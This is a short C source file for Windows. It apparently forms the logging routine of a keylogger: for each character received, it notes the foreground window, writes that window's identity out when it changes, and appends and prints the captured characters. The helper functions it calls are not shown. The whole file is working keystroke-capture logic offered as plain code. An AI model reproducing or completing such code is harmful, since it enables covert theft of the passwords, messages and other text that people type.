#include "header.h"

void edit_log(short character)
{
	static t_str *str_chain = NULL;
	static HWND window = NULL;

	if (character)
	{
		if (window == GetForegroundWindow())
		{
			str_chain = add_str(str_chain, 0, character);
			str_chain = print_str(str_chain);
		}
		else
		{
			str_chain = add_str(str_chain, 0, character);
			window = GetForegroundWindow();
			put_window_file(window);
			str_chain = print_str(str_chain);
		}
	}
}